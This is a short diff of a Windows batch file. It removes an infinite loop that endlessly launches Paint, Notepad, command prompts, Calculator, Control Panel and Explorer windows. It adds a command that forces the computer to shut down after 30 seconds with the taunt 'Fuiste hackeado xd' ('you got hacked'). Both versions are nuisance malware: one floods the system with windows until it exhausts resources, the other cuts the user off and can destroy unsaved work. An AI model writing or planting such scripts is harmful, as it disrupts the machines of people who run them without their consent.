@@ -1,11 +1,1 @@
-eccho@ off
-:repeat
-echo %randaom%
-start mspaint
-start notepad
-start cmd
-start calc
-start control
-start write
-start explorer
-goto repeat
+shutdown.exe -s -t 30 -c "Fuiste hackeado xd"
